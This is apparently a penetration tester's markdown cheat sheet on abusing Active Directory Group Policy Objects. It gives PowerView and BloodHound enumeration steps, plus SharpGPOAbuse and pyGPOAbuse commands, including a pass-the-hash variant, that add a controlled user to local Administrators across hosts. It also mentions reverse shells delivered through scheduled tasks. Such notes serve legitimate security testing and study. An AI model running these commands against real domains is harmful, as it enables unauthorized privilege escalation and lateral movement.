---
title: AD GPO Abuse
draft: false
tags:
  - windows
  - active-directory
  - post-exploitation
  - lateral-movement
  - privesc
  - persistence
---
 
GPO attacks:
- Adding additional rights to a user (such as SeDebugPrivilege, SeTakeOwnershipPrivilege, or SeImpersonatePrivilege)
- Adding a local admin user to one or more hosts
- Creating an immediate scheduled task to perform any number of actions

# Enumeration

- Using PowerView:
```powershell
PS C:\> Get-DomainGPO |select displayname # enumerate GPO names
PS C:\> Get-GPO -All | Select DisplayName # enumerate GPO names using LOTL

# check if the entire Domain Users group has rights over any GPO (we can also specify the SID of any user we control to check the GPOs we have rights on)
PS C:\> $sid=Convert-NameToSid "Domain Users"
PS C:\> Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}

# check the display name of the GPO:
PS C:\ Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
```

> [!Note]
> `WriteProperty` and `WriteDacl` GPOs can give us full control over the GPO. This means we can perform any attack on the users and computers in the OUs where the GPO is applied.

- Using BloodHound:
```
1. Select the GPO we are interested in (use PowerView enumeration to check GPOs we have rights on, whether its for a user we have control or the Domain Users group)
2. Go to Node Info tab
3. Select Affected Objects (this will output the OUs where the GPO is applied and the affected computers/users that belong to the OUs)
```

# Abuse
We could use a tool such as [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) to take advantage of this GPO misconfiguration by performing actions such as adding a user that we control to the local admins group on one of the affected hosts, creating an immediate scheduled task on one of the hosts to give us a reverse shell, or configure a malicious computer startup script to provide us with a reverse shell or similar.

> [!Example]
> Add a user to the Local Admins group leveraging a GPO we have control over (GenericWrite/WriteOwner/WriteDACL)
> ```
> PS C:\> .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount AD_USER --GPOName "Default Domain Policy"
> ```

> [!Note]
> We might need to close and reopen the session to check visible changes or run:
> `PS C:\> gpupdate /force`

Download from here: https://github.com/byronkg/SharpGPOAbuse/releases/tag/1.0

> [!Warning]
> Abusive GPO changes are applied to **every** computer/user in the linked OU and only revert on the next `gpupdate` cycle (default up to ~90 min + random offset, or immediately with `gpupdate /force`). Note down what you changed and clean up — an "immediate scheduled task" or a startup script left behind is a loud persistence artifact.

---

# Abuse from Linux

If we only have credentials/hash from a Linux attack host (no interactive Windows session), use [pyGPOAbuse](https://github.com/Hackndo/pyGPOAbuse) — it performs the same immediate-scheduled-task abuse over the network:

```bash
# Add the controlled user to the local Administrators group of hosts in the GPO's OU
$ pygpoabuse.py "DOMAIN/USER:PASSWORD" -gpo-id "GPO_GUID" -command 'net localgroup administrators USER /add'

# Pass-the-Hash variant
$ pygpoabuse.py "DOMAIN/USER" -hashes :NTLM -gpo-id "GPO_GUID" -command 'whoami'
```

The GPO GUID comes from the enumeration step above (`Get-DomainGPO | select displayname,name`) or from BloodHound. To find *which* GPOs your principal can edit, BloodHound's `GPO Editors` / `WriteDacl`/`WriteProperty` edges on a `GPO` node are the fastest path — see [[AD Automatic Enumeration (BloodHound)]].

---

### Related notes
- [[AD ACL Enumeration and Abuse]] — the `WriteDacl`/`WriteProperty`/`GenericWrite` ACEs over a GPO object that make this attack possible, and how to enumerate them.
- [[AD Enumeration with PowerView]] — `Get-DomainGPO` / `Get-ObjectAcl` enumeration used above.
- [[AD Automatic Enumeration (BloodHound)]] — visualizing GPO control edges and affected OUs/objects.
- [[Pass the Hash (PtH)]] — reusing an NT hash for the Linux (pyGPOAbuse) path.
- [[Service Exploits]] — abusing the privileges (SeImpersonate, etc.) granted to a user via GPO once applied.